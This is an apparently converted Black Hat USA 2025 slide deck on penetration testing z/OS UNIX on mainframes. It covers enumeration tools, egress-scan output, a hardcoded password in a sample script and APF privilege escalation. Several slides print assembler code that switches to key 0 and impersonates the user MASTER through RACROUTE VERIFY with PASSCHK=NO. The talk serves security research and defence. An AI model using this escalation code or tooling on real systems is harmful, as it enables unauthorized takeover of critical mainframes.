---
title: "Unix Underworld Tales from the Dark Side of zOS"
speakers: ["Philip Young", "Chad Rikansrud"]
conference: "Black Hat"
conference_full: "Black Hat USA 2025"
edition: "USA"
year: 2025
source_pdf: "BlackHat_USA_2025_Slides/Philip Young&Chad Rikansrud_Unix Underworld Tales from the Dark Side of zOS.pdf"
pages: 130
sha256: "efdf6b83595bc5f528b584e8ab7b23d0085ebe273cd79236fb52e9b8cd5afb5a"
text_chars: 45513
ocr_pages: 9
has_ocr: true
redacted_secrets: 0
ocr_confidence: 89.2
ocr_unreliable_blocks: 0
vision_verified_blocks: 2
ocr_timeouts: 0
pages_recovered_from_text_layer: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T05:19:05Z"
---
# Unix Underworld Tales from the Dark Side of zOS

**Speakers:** Philip Young, Chad Rikansrud  
**Conference:** Black Hat USA 2025  
**Source:** `BlackHat_USA_2025_Slides/Philip Young&Chad Rikansrud_Unix Underworld Tales from the Dark Side of zOS.pdf` (130 pages)


## Slide 1

**Unix Underworld Tales from the Dark Side of z/OS**

**Philip Young Director Mainframe Penetration Testing Services, NetSPI Chad Rikansrud Chief Mainframe Hacker, Broadcom**

#BHUSA @BlackHatEvents

## Slide 2

2
#BHUSA @BlackHatEvents

## Slide 3

Chad Rikansrud
Software security researcher
Broadcom

3
#BHUSA @BlackHatEvents

## Slide 4

- 90s Hacker Kid **Bigendian Smalls**

- • Mainframe Security Enthusiast • Loves showtunes • Reverse Engineer • Pentesting Mainframes for 10+ years

#BHUSA @BlackHatEvents

## Slide 5

Philip Young
Director of Mainframe Penetration Testing
NetSPI

5
#BHUSA @BlackHatEvents

## Slide 6

### **Soldier of FORTRAN**

- 90s Hacker Kid

- Mainframe Security Enthusiast

- Terrible Karaoke Singer

- Always felt like an outsider

- Pentesting Mainframes for 10+ years

7 #BHUSA @BlackHatEvents

## Slide 7

Mark Wilson

- The OG Mainframe Hacker

- Tools based on his misadventures

- Knows more about RACF than I ever will

- Works on mainframe part time when he takes a break from his full time motorcycle repair shop

#BHUSA @BlackHatEvents

## Slide 8

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 90/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
we Smalls
: @bigendiansmalls
It’s a user catalog, Michael. How many could we possibly need, 100?
lol. Imao, even.
New variable type just dropped “Hope” - size varies, pretty sure it’ll be
correct. maybe...
@mainframed767 - <33333
* CDR.TODO — NEED TO MAKE THIS MORE ACCURATE
kK
```

## Slide 9

This!

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 91/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
BE Windows PowerShell X $63. Settings
Cursor= (20,16), Size= (24,80), KeyLock= 0, Session= VM3 16:15:31
z/VM ONLINE
Use Of This System Is For
IBM Management Approved Purposes Only
VTAM Customers: To exit screen, enter
Fill in your USERID and PASSWORD and press ENTER
(Your password will not appear when you type it)
USERID ==>
PASSWORD =>
```

## Slide 10

And This!

#BHUSA @BlackHatEvents


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 82/100 on the text kept, 79/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
SIGNON              UNIVERSITY                                DATE: 11/03/22
SYSTEM: CICSTP01    Division of Information Technology         TIME: 16:32:38
TERMID: 0604          C I C S   P r o d u c t i o n
================================================================================
Customer Assistance and Problem Reporting, call the Help desk at 301-405-1500.


            CCCCCC    IIIII    CCCCCC     SSSSSS
           CCCCCCCC   IIIII   CCCCCCCC   SSSSSSSS
          CCCC  CC     III    CCCC  CC   SSSS  SS
         CCC           III    CCC         SSSS
        CCC            III    CCC          SSSS
       CCCC  CC        III    CCCC  CC   SS  SSSS
      CCCCCCCC        IIIII   CCCCCCCC   SSSSSSSS
     CCCCCC           IIIII   CCCCCC     SSSSSS       6.5.0


Fill in your USERID and PASSWORD then press ENTER to sig[obscured]
   USERID: ________       PASSWORD:              BYPASS INITIAL KE[obscured]

PRESS: ENTER=Signon,   F1=Help,   F3=Exit CICS

[pink callout overlaying lower right of the screen] And This!
```

## Slide 11

But Not This!

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 88/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
System: BYA400
Subsystem: WHSTEO2
User il Workstation: WHE93MTIA
Passuord
NMOTICES Access to this device is restricted to authorized us -r business
purposess By signing into this systems users agree to the Cy “ter use
policy in the Employee figreement and acknowledge that their, -ions
may be monitored and/or logged+s The unauthorized accesss u ~f
this system or of the data contained therein or exchanged
prohibited and may violate your region's laus»
@
```

## Slide 12

#BHUSA @BlackHatEvents

## Slide 13

#BHUSA @BlackHatEvents

## Slide 14

#BHUSA @BlackHatEvents
Terminal
Card Reader
Button Pusher

## Slide 15

#BHUSA @BlackHatEvents

## Slide 16

Now This!

#BHUSA @BlackHatEvents

## Slide 17

#### **Companies Rely On It**

**At most companies, z/OS mainframes represents a systemically important platform where downtime is counted in seconds and minutes.**

**This is but a tiny representation of the kinds of companies that runs z/OS**

#BHUSA @BlackHatEvents

## Slide 18

#### **Terminology**

**RACF APF Library Security manager for z/OS. Contains programs which Controls access to datasets, can change their memory key resources, and system to key 0. functions. Stores user profiles and credentials and attributes like SPECIAL and OPERATIONS. SPECIAL/ KEY 0 OPERATIONS Storage protection key that bypasses all memory access In RACF grants elevated controls. Programs running system privileges. For in Key 0 can read/write any example, create add or edit memory location in the an APF authorized library. system.**

#BHUSA @BlackHatEvents

## Slide 19

#### **What? Me Hack Mainframes?**

- **That’s unpossible**

- **Can’t buffer overflow**

- **No current tooling**

- **Standard Exploits don’t work**

- **It’s too complex**

#BHUSA @BlackHatEvents

## Slide 20

#### **Mainframe Attack Paths**

# 1.

###### **Network**

TCP/IP and SNA network attack paths can allow an attacker unauthorized access. For example, using CICS CECI transaction for LFI or an insecure web app.

# 3.

###### **External Security Manager**

RACF, ACF2 or TopSecret all have their quirks, misconfigured security settings could inadvertently let users read all files in z/OS UNIX, or submit jobs as someone else, the opportunities are endless.

# 2.

###### **Filesystem**

Improperly locked down dataset access allows for multiple escalation paths from reading sensitive data to complete system compromise through APF privilege escalation.

# 4.

###### **z/OS UNIX**

Runs inside z/OS, is a full blown UNIX environment, is largely overlooked by it security and mainframe operations and is the fopcus of this talk.

#BHUSA @BlackHatEvents

## Slide 21

#BHUSA @BlackHatEvents

## Slide 22

#BHUSA @BlackHatEvents

## Slide 23

Mainframe
Attack Paths
1. 2.
Network Filesystem
TCP/IP and SNA network attack paths can allow  Improperly locked down dataset access allows for
an attacker unauthorized access. For example,  multiple escalation paths from reading sensitive
using CICS CECI transaction for LFI or an  data to complete system compromise through APF
insecure web app.  privilege escalation.
3. 4.
External Security Manager z/OS UNIX
RACF, ACF2 or TopSecret all have their quirks,  Runs inside z/OS, is a full blown UNIX
misconfigured security settings could inadvertently  environment, is largely overlooked by it security
let users read all files in z/OS UNIX, or submit jobs  and mainframe operations and is the fopcus of this
as someone else, the opportunities are endless.  talk.
#BHUSA @BlackHatEvents

## Slide 24

#### **Mainframe Known by Attack Paths Many Names**

**1991**

**1994 1998** 1. 2. **OpenEdition Unix System Services Network Filesystem** Provided basic UNIX System V Now fully integrated into z/OS, adds TCP/IP and SNA network attack paths can allow Improperly locked down dataset access allows for interfaces, Introduced the HFS, support for more modern ZFS, Better an attacker unauthorized access. For example, multiple escalation paths from reading sensitive not fully integrated to z/OSusing CICS CECI transaction for LFI or an external security manager integration, data to complete system compromise through APF insecure web app. USS privilege escalation. **1996 Today z/OS UNIX** 3. **OpenEdition 4.** Obtained POSIX compliance, EBCDIC and ASCII support, **External Security Manager z/OS UNIX** added TCP/IP integration, more open/gnu tools, RACF, ACF2 or TopSecret all have their quirks, which replaced older TCP **Runs inside z/OS, is a full blown UNIX** multiple compilers like C, misconfigured security settings could inadvertently implementation, obtains **environment, is largely overlooked by it security** Rust, scripting with Python let users read all files in z/OS UNIX, or submit jobs official UNIX branding **and mainframe operations and is the fopcus of this** as someone else, the opportunities are endless. **talk.** 28

#BHUSA @BlackHatEvents

## Slide 25

#### **z/OS UNIX Primer**

**It’s a command interpreter with scripting capabilities. Default Shells: /bin/sh /bin/tcsh**

**Execution context determines privilege level.**

#BHUSA @BlackHatEvents

## Slide 26

#### **z/OS UNIX Primer**

**Hierarchical structure rooted at / Directory traversal and path manipulation are common attack vectors.**

#BHUSA @BlackHatEvents

## Slide 27

#### **z/OS UNIX Primer**

**File-level permission bits (rwx), e.g. -r-xrwx-rw ESMs like RACF can add more granular access control on top of the file system permissions**

**Though sometimes makes permissions less secure**

#BHUSA @BlackHatEvents

## Slide 28

#### **z/OS UNIX Primer**

**You access the UNIX environment via: OMVS command in TSO SSH sessions Using JCL, or batch processing, with BPXBATCH**

#BHUSA @BlackHatEvents

## Slide 29

#### **z/OS UNIX Primer**

**UNIX processes can access MVS datasets e.g. cp "//’DATASET.NAME’” /some/file**

#BHUSA @BlackHatEvents

## Slide 30

**34** #BHUSA @BlackHatEvents

## Slide 31

Enumeration
#BHUSA @BlackHatEvents

## Slide 32

#### **Multiple Tools Exist**

###### **ENUM**

- A rexx script to enumerate z/OS settings and security

- Uses in memory information

- Works in TSO and UNIX

###### **OMVSEnum.sh**

- A tcsh shell script

- Checks file permissions, schedulers, mail, RACF permissions

###### **FileTraversal**

- A java program

- Find any UNIX file you have read access to (can also find write)

###### **zOSHog**

- A java program

- Uses regex to search for secret

###### **portscan.c/portscan.java**

- Maps open ports

- Service identification

- Egress testing

#BHUSA @BlackHatEvents

## Slide 33

###### **https://github.com/mainframed/Enumeration/tree/master/Unix**

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 92/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
https://github.com/mainframed/Enumeration/tree/master/Unix
Enumeration /Unix/ Add file ~
@ mainframed updating portscan to add a little more verbosity eb1c18-6 months ago ©) History
Name Last commit message Last commit date
ALL.JCL moving some files around 7 months ago
ALL.sh minor renaming of steps 7 months ago
FileSystemTraversal.java moving some files around 7 months ago
OMVSEnum.sh moving some files around 7 months ago
README.md moving some files around 7 months ago
a
B AUTOMVS.XMIT changed all.sh to use STDOUT, added XMIT of the JCL 7 months ago
a
B
a
portscan.java updating portscan to add a little more verbosity 6 months ago
Unix Enumeration Tools
This folder contains various tools used to enumeration unix system services on z/OS.
```

## Slide 34

#### **Compiling & Uploading**

**Keen observers saw ‘ALL.jcl’ in the github repo. A single job stream that:**

- **Adds ENUM to your home folder and makes it executable**

- **Adds OMVSEnum.sh, renamed to OMVSSed.sh, to your home folder and makes it executable**

- **Adds FileTraversal and portscan and compiles them with JAVA**

#BHUSA @BlackHatEvents

## Slide 35

**We use the Linux program** **`scp` to copy ALL.jcl to our in scope, only problem is it only supports BINARY transfers**

**Then we** **`submit all.jcl` on the LPAR**

#BHUSA @BlackHatEvents

## Slide 36

**We use the Linux program** **`scp` to copy ALL.jcl to our in scope, only problem is it only supports BINARY transfers**

**Then we** **`submit all.jcl` on the LPAR**

#BHUSA @BlackHatEvents

## Slide 37

We use the Linux program   scp to copy ALL.jcl to our in scope,
only problem is it only supports BINARY transfers
>
Then we  submit all.jcl on the LPAR
#BHUSA @BlackHatEvents

## Slide 38

#### ENUM.REXX

#BHUSA @BlackHatEvents

## Slide 39

**OMVSEnum**

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 94/100 on the text kept, 76/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
# Local Unix System Services Enumeration & Privilege Escalation Script #
# Soldier of FORTRAN # @mainframed767 #
# version 0.1b
# Based on LinEnum.sh
# Example: ./OMVSSed.sh -k keyword -r report -e /tmp/ -t
OPTIONS:
Enter keyword
Enter export Location
Enter report name
Thorough tests (takes Longer)
Displays this help text
Running with no options = limited scans/no output file
>
```

## Slide 40

OMVSEnum.sh

#BHUSA @BlackHatEvents

## Slide 41

**Egress Busting**

**You would be surprised how often this works Network routes from before most of you were born Very simple:**

**1. On the mainframe run the java program** **_portscan_**

**2. On AWS (or any provider) run a tool like** **_Egressbuster_**

#BHUSA @BlackHatEvents

## Slide 42

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 94/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
PHIL:/u/phil: >java -cp '.' portscan 3.145.142.29 1330 1340 -t 100 -¢ Ae
PortScan by SirCICSalot ©
$.145.142.29
Trying Port: 1330
Trying Port: 1331
Port 1331 is open
Trying Port: 1332
Port 1332 is open
Trying Port: 1333
Port 1333 is open
Trying Port: 1334
Port 1334 is open
Trying Port: 1335
Port 1335 is open
Trying Port: 1336
Port 1336 is open
Trying Port: 1337
Port 1337 is open
Trying Port: 1338
Port 1338 is open
Trying Port: 1339
Port 1339 is open
Trying Port: 1340
Port 1340 is open
PHIL:/u/phil: >
```

## Slide 43

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 91/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
admin@ip-172-31-24-128:~/egressTester$ sudo ./egresstester.py 172.31.24.128 enXO -v
Mainframe Testing Team Presents: Network Egress Tester
Arguments: Namespace(local_ip='172.31.24.128', interface='enX0', source_ip='0.0.0.0/0', start_pd
rbose=True, logfile=None)
Current UID: 0
Inserting iptables rule to redirect connections from 0.0.0.0/0 ports 1 to 65535 to port 55901/td
[*] Listening on TCP ports 1 to 65535
[x] Press control-c when finished
[+] Connection from 34.198.158.143 (mainframe. .com) port: 1337/tcp (0 bytes)
[+] Connection from 34.198.158.143 (mainframe. .com) port: 1340/tcp (0 bytes)
[+] Connection from 34.198.158.143 (mainframe. .com) port: 1331/tcp (0 bytes)
[+] Connection from 34.198.158.143 (mainframe. .com) port: 1332/tcp (0 bytes)
[+] Connection from 34.198.158.143 (mainframe. .com) port: 1333/tcp (0 bytes)
[+] Connection from 34.198.158.143 (mainframe. .com) port: 1334/tcp (0 bytes)
[+] Connection from 34.198.158.143 (mainframe. .com) port: 1335/tcp (0 bytes)
[+] Connection from 34.198.158.143 (mainframe. .com) port: 1336/tcp (0 bytes)
[+] Connection from 34.198.158.143 (mainframe. .com) port: 1337/tcp (0 bytes)
[+] Connection from 34.198.158.143 (mainframe. .com) port: 1338/tcp (0 bytes)
```

## Slide 44

Analysis
#BHUSA @BlackHatEvents

## Slide 45

**ENUM Rexx Script Ouput**

./ENUM.rexx ... External Security Manager: Product: RACF Version: FMID HRF7791 Datasets: Primary: SYS1.RACFDS Backup:  SYS1.RACFDS.BACKUP ... KDFAES encryption is not active

#BHUSA @BlackHatEvents

## Slide 46

**ENUM Rexx Script Ouput**

./ENUM.rexx ... External Security Manager: Product: RACF Version: FMID HRF7791 Datasets: Primary: SYS1.RACFDS Backup:  SYS1.RACFDS.BACKUP ... KDFAES encryption is not active

#BHUSA @BlackHatEvents

## Slide 47

#### **OMVSEnum Script Ouput**

> ./OMVSSed.sh

...

[+] We can su to root without a password!

...

dr-xr-xr-x    2 CHAD     RULES       8192 Jul 16 10:15 DEFCON/ dr-xr-xr-x    2 PHIL     DROOLS      8192 Jul 16 18:05 BlackHat/ -rwxrwxrwx 1 OMVS     OMVSGRP     1163 Jul 25  2024 /etc/inetd.conf -rwxrwxrwx 2 OMVS     OMVSGRP     1024 Jul 13 16:05 /bin/run.sh ... [+] Unix Privileged RACF resources: SUPERUSER.FILESYS.MOUNT ...

[+] We can issue extattr +a!

#BHUSA @BlackHatEvents

## Slide 48

#### **OMVSEnum Script Ouput**

> ./OMVSSed.sh

... [+] We can su to root without a password! ... dr-xr-xr-x    2 CHAD     RULES       8192 Jul 16 10:15 DEFCON/ dr-xr-xr-x    2 PHIL     DROOLS      8192 Jul 16 18:05 BlackHat/ -rwxrwxrwx 1 OMVS     OMVSGRP     1163 Jul 25  2024 /etc/inetd.conf -rwxrwxrwx 2 OMVS     OMVSGRP     1024 Jul 13 16:05 /bin/run.sh ... [+] Unix Privileged RACF resources: SUPERUSER.FILESYS.MOUNT ... [+] We can issue extattr +a!

#BHUSA @BlackHatEvents

## Slide 49

#### **OMVSEnum Script Ouput**

> ./OMVSSed.sh ... [+] We can su to root without a password! ...

dr-xr-xr-x    2 CHAD     RULES       8192 Jul 16 10:15 DEFCON/ dr-xr-xr-x    2 PHIL     DROOLS      8192 Jul 16 18:05 BlackHat/ -rwxrwxrwx 1 OMVS     OMVSGRP     1163 Jul 25  2024 /etc/inetd.conf -rwxrwxrwx 2 OMVS     OMVSGRP     1024 Jul 13 16:05 /bin/run.sh ... [+] Unix Privileged RACF resources: SUPERUSER.FILESYS.MOUNT ... [+] We can issue extattr +a!

#BHUSA @BlackHatEvents

## Slide 50

#### **OMVSEnum Script Ouput**

> ./OMVSSed.sh

...

[+] We can su to root without a password!

...

dr-xr-xr-x    2 CHAD     RULES       8192 Jul 16 10:15 DEFCON/ dr-xr-xr-x    2 PHIL     DROOLS      8192 Jul 16 18:05 BlackHat/ -rwxrwxrwx 1 OMVS     OMVSGRP     1163 Jul 25  2024 /etc/inetd.conf -rwxrwxrwx 2 OMVS     OMVSGRP     1024 Jul 13 16:05 /bin/run.sh ... [+] Unix Privileged RACF resources: SUPERUSER.FILESYS.MOUNT ...

[+] We can issue extattr +a!

#BHUSA @BlackHatEvents

## Slide 51

#### **OMVSEnum Script Ouput**

> ./OMVSSed.sh

...

[+] We can su to root without a password!

...

dr-xr-xr-x    2 CHAD     RULES       8192 Jul 16 10:15 DEFCON/ dr-xr-xr-x    2 PHIL     DROOLS      8192 Jul 16 18:05 BlackHat/ -rwxrwxrwx 1 OMVS     OMVSGRP     1163 Jul 25  2024 /etc/inetd.conf -rwxrwxrwx 2 OMVS     OMVSGRP     1024 Jul 13 16:05 /bin/run.sh ... [+] Unix Privileged RACF resources: SUPERUSER.FILESYS.MOUNT ...

[+] We can issue extattr +a!

#BHUSA @BlackHatEvents

## Slide 52

**zOSHog Ouput**

> /usr/lpp/java/J8.0_64/bin/java -jar zoshog.jar Usage: java zosHog <directory_path> > /usr/lpp/java/J8.0_64/bin/java -jar zoshog.jar /u/ rw-r--r-- /u/PHIL/maintenance/daily_stats.py:9 password = "3$vByHd%" >

#BHUSA @BlackHatEvents

## Slide 53

**zOSHog Ouput**

> /usr/lpp/java/J8.0_64/bin/java -jar zoshog.jar Usage: java zosHog <directory_path> > /usr/lpp/java/J8.0_64/bin/java -jar zoshog.jar /u/ rw-r--r-- /u/PHIL/maintenance/daily_stats.py:9 password = "3$vByHd%" >

#BHUSA @BlackHatEvents

## Slide 54

Privilege
Escalation
#BHUSA @BlackHatEvents

## Slide 55

#### **Stored Credentials**

**Don’t store passwords in files**

**If storing them is required, make sure the file permission bits are appropriate -rwx------ (owner read/write/x, group and world: none)**

**Using tools like zOSHog or FileTraversal and even z/OS UNIX built in tools make it trivial to find files with secrets.**

#BHUSA @BlackHatEvents61

## Slide 56

#### **/u/phil/maintenance/daily_stats.py**

\```
# This script connects to the CICS webserver
# to test that it is running
\```

\```
importrequests
fromrequests.authimportHTTPBasicAuth
\```

\```
url="your_website_url"
\```

\```
username =”phil"
password ="3$vByHd%"
\```

\```
response =requests.get(url, auth=HTTPBasicAuth(username, password))
ifresponse.status_code==200:
print("Successfully connected to the website.")
print(response.text) # Print the content of the response
else:
\```

\```
print(f"Failedto connect. Status code: {response.status_code}")
print(response.text) # Optionally print the error response
\```

#BHUSA @BlackHatEvents62

## Slide 57

#### **/u/phil/maintenance/daily_stats.py**

\```
# This script connects to the CICS webserver
# to test that it is running
\```

\```
importrequests
fromrequests.authimportHTTPBasicAuth
\```

\```
url="your_website_url"
\```

\```
username =”phil"
password ="3$vByHd%"
\```

\```
response =requests.get(url, auth=HTTPBasicAuth(username, password))
ifresponse.status_code==200:
print("Successfully connected to the website.")
print(response.text) # Print the content of the response
else:
\```

\```
print(f"Failedto connect. Status code: {response.status_code}")
print(response.text) # Optionally print the error response
\```

#BHUSA @BlackHatEvents63

## Slide 58

#BHUSA @BlackHatEvents

## Slide 59

#### **UNIX & APF Authorized**

###### **z/OS adds extra bits in addition to permissions**

   - **Importantly the a bit, which denotes a program as APF authorized**

- **To set this bit z/OS UNIX provides the program  extattr**

- `extattr` `+a` **gives a program APF auth**

- **Access to run this is controlled by BPX.EXTATTR.APF**

- **The HFS/ZFS datasets DO NOT need to be APF authorized!**

#BHUSA @BlackHatEvents

## Slide 60

#### **OMVSEnum Script Ouput**

> ./OMVSSed.sh

...

[+] We can su to root without a password!

...

dr-xr-xr-x    2 CHAD     RULES       8192 Jul 16 10:15 DEFCON/ dr-xr-xr-x    2 PHIL     DROOLS      8192 Jul 16 18:05 BlackHat/ -rwxrwxrwx 1 OMVS     OMVSGRP     1163 Jul 25  2024 /etc/inetd.conf -rwxrwxrwx 2 OMVS     OMVSGRP     1024 Jul 13 16:05 /bin/run.sh ... [+] Unix Privileged RACF resources: SUPERUSER.FILESYS.MOUNT ...

[+] We can issue extattr +a!

#BHUSA @BlackHatEvents

## Slide 61

**Understanding APF Privilege Escalation**

**How do we Change to Key 0?**

#BHUSA @BlackHatEvents

## Slide 62

**How do we Change to Key 0?**

**MODESET KEY** = **ZERO** ,MODE=SUP

#BHUSA @BlackHatEvents

## Slide 63

#### **How do we Change to Key 0?**

**MODESET KEY** = **ZERO** ,MODE=SUP

**To issue MODESET KEY=ZERO the program must be APF authorized: By placing it in an APF authorized dataset OR In UNIX by giving it the extra attribute +a**

**(if you’re a mainframer, yes we know there’s more methods)**

#BHUSA @BlackHatEvents

## Slide 64

#### **Understanding APF Privilege Escalation**

008FA948  :  C1 C3 C5 C5 FF 00 00 C0  |  ACEE.... 008FA950  :  03 0D 94 B1 00 00 00 00  |  ..m..... 008FA958  :  00 00 00 00 04 D7 C8 C9  |  .....PHI 008FA960  :  D3 40 40 40 40 06 D5 C5  |  L    .NE 008FA968  :  E3 E2 D7 C9 40 40 01 01  |  TSPI  .. 008FA970  :  04 25 19 5F 40 40 40 40  |  ...^ 008FA978  :  40 40 40 40 00 8F A9 88  |      ..zh 008FA980  :  00 00 00 00 00 00 00 00  |  ........ 008FA988  :  C1 C3 F1 F0 F6 F4 F8 C6  |  AC10648F 008FA990  :  00 00 00 00 00 00 00 00  |  ........ 008FA998  :  00 00 00 00 00 00 00 00  |  ........ 008FA9A0  :  40 40 40 40 40 40 40 40  | 008FA9A8  :  00 00 00 00 00 8F AA 08  |  ........ 008FA9B0  :  00 00 00 00 00 00 00 00  |  ........ 008FA9B8  :  00 00 00 00 00 8F AA 20  |  ........ 008FA9C0  :  00 00 00 00 01 25 19 5F  |  .......^ 008FA9C8  :  00 00 00 00 00 20 00 00  |  ........ 008FA9D0  :  00 00 00 00 00 00 00 00  |  ........ 008FA9D8  :  00 00 00 00 00 00 00 00  |  ........ 008FA9E0  :  00 8F AA 58 00 00 00 00  |  ........ 008FA9E8  :  00 00 00 00 00 8F AA E8  |  .......Y 008FA9F0  :  00 00 00 00 00 00 00 00  |  ........ 008FA9F8  :  00 00 00 00 00 00 00 00  |  ........ 008FAA00  :  00 00 00 00 14 45 36 10  |  ........

**0**

8

#BHUSA @BlackHatEvents

## Slide 65

#### **Understanding APF Privilege Escalation**

**008FA948  :  C1 C3 C5 C5 FF 00 00 C0  |  ACEE.... 008FA950  :  03 0D 94 B1 00 00 00 00  |  ..m..... 008FA958  :  00 00 00 00 04** D7 C8 C9 **C3 C8 C1 |  .....** PHI **CHA 008FA960  :** D3 **C4 40 40 40 40 06** D5 C5 **C2 D9 |** L **D .** NE **BR 008FA968  :** E3 E2 D7 C9 40 40 **D6 C1 C4 C3 D6 D4 01 01  |** TSPI **OADCOM .. 008FA970  :  04 25 19 5F 40 40 40 40  |  ...^ 008FA978  :  40 40 40 40 00 8F A9 88  |      ..zh 008FA980  :  00 00 00 00 00 00 00 00  |  ........ 008FA988  :  C1 C3 F1 F0 F6 F4 F8 C6  |  AC10648F 008FA990  :  00 00 00 00 00 00 00 00  |  ........ 008FA998  :  00 00 00 00 00 00 00 00  |  ........ 008FA9A0  :  40 40 40 40 40 40 40 40  | 008FA9A8  :  00 00 00 00 00 8F AA 08  |  ........ 008FA9B0  :  00 00 00 00 00 00 00 00  |  ........ 008FA9B8  :  00 00 00 00 00 8F AA 20  |  ........ 008FA9C0  :  00 00 00 00 01 25 19 5F  |  .......^ 008FA9C8  :  00 00 00 00 00 20 00 00  |  ........ 008FA9D0  :  00 00 00 00 00 00 00 00  |  ........ 008FA9D8  :  00 00 00 00 00 00 00 00  |  ........ 008FA9E0  :  00 8F AA 58 00 00 00 00  |  ........ 008FA9E8  :  00 00 00 00 00 8F AA E8  |  .......Y 008FA9F0  :  00 00 00 00 00 00 00 00  |  ........ 008FA9F8  :  00 00 00 00 00 00 00 00  |  ........ 008FAA00  :  00 00 00 00 14 45 36 10  |  ........**

#BHUSA @BlackHatEvents

## Slide 66

\```
X
X
X
X
X
X
X
X
\```

\```
X
\```

#### **UNIX APF Privilege Escalation**

`&LOAD. CSECT &LOAD. AMODE 31 YREGS , REGISTER SYMBOLS IN SYS1.MACLIB BAKR R14,0 CREATE A STACK ENTRY BUT DO NOT BRANCH LR R12,R15 USING &LOAD.,R12 PROGRAM BASE DS 0H **************************** *    CODE START            * **************************** MODESET KEY=ZERO,MODE=SUP L R5,ASCBPVT L R5,ASCBASXB(R5) SR R1,R1 ST R1,ASXBSENV(R5) RACROUTE REQUEST=VERIFY, ENVIR=CREATE, USERID=USERLEN, PASSCHK=NO, WORKA=RACWK, RELEASE=2.1, STAT=NO, LOG=NONE, MF=(E,RCLIST) MODESET KEY=NZERO,MODE=PROB **************************** *    EXIT                  * **************************** ST R15,LRETCODE PR DS 0F RACWK DS CL512 LRETCODE DS F RETURN CODE FLDGRPT DC A(1) DO NOT CHANGE FIELD1 DC CL8'PGMRNAME' DO NOT CHANGE USERLEN DC X'06' THIS LEN MUST BE EQUAL TO ID USERID USERID DC CL8'MASTER' USERID TO IMPERSONATE RESULT DC CL8'XXXXXXXX' DO NOT CHANGE RCLIST RACROUTE REQUEST=VERIFY,MF=L,RELEASE=2.1,` #BHUSA @BlackHatEvents `WORKA=*-* SC Q '22 '`

## Slide 67

\```
X
X
X
X
X
X
X
X
\```

\```
X
\```

#### **UNIX APF Privilege Escalation**

`&LOAD. CSECT &LOAD. AMODE 31 YREGS , REGISTER SYMBOLS IN SYS1.MACLIB BAKR R14,0 CREATE A STACK ENTRY BUT DO NOT BRANCH LR R12,R15 USING &LOAD.,R12 PROGRAM BASE DS 0H **************************** *    CODE START            * **************************** MODESET KEY=ZERO,MODE=SUP L R5,ASCBPVT L R5,ASCBASXB(R5) SR R1,R1 ST R1,ASXBSENV(R5) RACROUTE REQUEST=VERIFY, ENVIR=CREATE, USERID=USERLEN, PASSCHK=NO, WORKA=RACWK, RELEASE=2.1, STAT=NO, LOG=NONE, MF=(E,RCLIST) MODESET KEY=NZERO,MODE=PROB **************************** *    EXIT                  * **************************** ST R15,LRETCODE PR DS 0F RACWK DS CL512 LRETCODE DS F RETURN CODE FLDGRPT DC A(1) DO NOT CHANGE FIELD1 DC CL8'PGMRNAME' DO NOT CHANGE USERLEN DC X'06' THIS LEN MUST BE EQUAL TO ID USERID USERID DC CL8'MASTER' USERID TO IMPERSONATE RESULT DC CL8'XXXXXXXX' DO NOT CHANGE RCLIST RACROUTE REQUEST=VERIFY,MF=L,RELEASE=2.1,` #BHUSA @BlackHatEvents `WORKA=*-* SC Q '22 '`

## Slide 68

\```
X
X
X
X
X
X
X
X
\```

\```
X
\```

#### **UNIX APF Privilege Escalation**

`&LOAD. CSECT &LOAD. AMODE 31 YREGS , REGISTER SYMBOLS IN SYS1.MACLIB BAKR R14,0 CREATE A STACK ENTRY BUT DO NOT BRANCH LR R12,R15 USING &LOAD.,R12 PROGRAM BASE DS 0H **************************** *    CODE START            * **************************** MODESET KEY=ZERO,MODE=SUP L R5,ASCBPVT L R5,ASCBASXB(R5) SR R1,R1 ST R1,ASXBSENV(R5) RACROUTE REQUEST=VERIFY, ENVIR=CREATE, USERID=USERLEN, PASSCHK=NO, WORKA=RACWK, RELEASE=2.1, STAT=NO, LOG=NONE, MF=(E,RCLIST) MODESET KEY=NZERO,MODE=PROB **************************** *    EXIT                  * **************************** ST R15,LRETCODE PR DS 0F RACWK DS CL512 LRETCODE DS F RETURN CODE FLDGRPT DC A(1) DO NOT CHANGE FIELD1 DC CL8'PGMRNAME' DO NOT CHANGE USERLEN DC X'06' THIS LEN MUST BE EQUAL TO ID USERID USERID DC CL8'MASTER' USERID TO IMPERSONATE RESULT DC CL8'XXXXXXXX' DO NOT CHANGE RCLIST RACROUTE REQUEST=VERIFY,MF=L,RELEASE=2.1,` #BHUSA @BlackHatEvents `WORKA=*-* SC Q '22 '`

## Slide 69

\```
X
X
X
X
X
X
X
X
\```

\```
X
\```

#### **UNIX APF Privilege Escalation**

